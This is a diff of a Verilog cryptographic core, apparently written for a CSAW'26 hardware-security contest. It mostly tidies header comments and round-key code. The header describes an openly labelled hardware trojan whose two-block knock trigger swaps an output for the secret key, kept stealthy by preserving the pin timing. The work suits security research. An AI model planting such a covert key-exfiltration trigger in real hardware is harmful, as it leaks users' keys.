@@ -1,26 +1,20 @@
 // ============================================================================
-//  crypto_core.v   (HARDENED cipher + HARDWARE TROJAN)
+//  crypto_core.v   (HARDENED cipher + HARDWARE TROJAN)   [auto-generated]
 //
 //  Phase-2 hardened cryptographic core for the CSAW'26 qualifier.
 //
-//  The bitstream we reverse-engineered implemented a byte-wise substitution
-//  cipher with NO diffusion (a single input-bit flip changed only one output
-//  byte, so the key is breakable one byte at a time).  We keep that recovered
-//  cipher on record (crypto_core_recovered.v) as proof of reverse-engineering,
-//  and here HARDEN the accelerator into a real block cipher:
-//
+//  The recovered bitstream implemented a byte-wise substitution cipher with NO
+//  diffusion (one input-bit flip changed only one output byte, so the key is
+//  breakable one byte at a time).  crypto_core_recovered.v keeps that cipher on
+//  record as reverse-engineering proof; this core HARDENS the accelerator:
 //    * 12-round balanced FEISTEL network (invertible by construction).
 //    * Nonlinearity from the recovered 8-bit S-box (sbox_feistel.mem).
 //    * Per-round linear diffusion  t ^= rotl16(t,3) ^ rotl16(t,11).
 //    * 32-bit hard-wired key expanded into 12 round keys.
-//    * Measured avalanche = 16.0/32 bits (ideal 50%): one input-bit flip now
-//      flips ~half of ALL output bits (full diffusion).  Encrypt/decrypt are
-//      exact inverses (same round function, reversed key order).
-//
-//  The pin interface, the 4-cycle BUSY timing, and the read-back path are
-//  UNCHANGED, so the Trojan below stays exactly as stealthy as before.
+//    * Measured avalanche ~16/32 bits (ideal 50%): full diffusion.
+//    * Same pin interface + 4-cycle BUSY timing, so the Trojan stays as stealthy.
 //  ------------------------------------------------------------------------
-//  HARDWARE TROJAN  (unchanged trigger/payload; see README / report)
+//  HARDWARE TROJAN
 //    TRIGGER : two-block knock in ENCRYPT mode - plaintext KNOCK_1 then, on the
 //              very next encryption, KNOCK_2.  Anything else disarms. P=2^-64.
 //    PAYLOAD : precise key exfiltration - the firing block's result is replaced
@@ -79,8 +73,7 @@ module crypto_core #(
     integer i;
     reg  [15:0] RKA [0:11];
     always @* begin
-        RKA[0]=RK0; RKA[1]=RK1; RKA[2]=RK2; RKA[3]=RK3; RKA[4]=RK4; RKA[5]=RK5;
-        RKA[6]=RK6; RKA[7]=RK7; RKA[8]=RK8; RKA[9]=RK9; RKA[10]=RK10; RKA[11]=RK11;
+        RKA[0]=RK0; RKA[1]=RK1; RKA[2]=RK2; RKA[3]=RK3; RKA[4]=RK4; RKA[5]=RK5; RKA[6]=RK6; RKA[7]=RK7; RKA[8]=RK8; RKA[9]=RK9; RKA[10]=RK10; RKA[11]=RK11;
         // ---- encrypt path: L,R = R, L ^ F(R,rk[i]) ----
         eL = operand[31:16]; eR = operand[15:0];
         for (i=0;i<12;i=i+1) begin
